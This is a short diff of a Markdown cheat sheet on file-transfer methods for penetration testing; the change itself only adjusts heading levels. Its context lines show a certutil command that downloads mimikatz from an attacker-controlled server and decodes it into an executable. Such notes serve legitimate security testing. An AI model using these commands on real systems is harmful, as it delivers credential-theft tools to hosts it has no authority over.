@@ -1,6 +1,6 @@
 # File-Transfert-Methods
 
-## Windows Methods
+# Windows Methods
 
 #### Powershell - Download in memory
 ```
@@ -42,7 +42,7 @@ certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimi
 certutil.exe -decode mimikatz.txt mimikatz.exe
 ```
 
-## Linux Methods
+# Linux Methods
 
 #### Curl
 ```
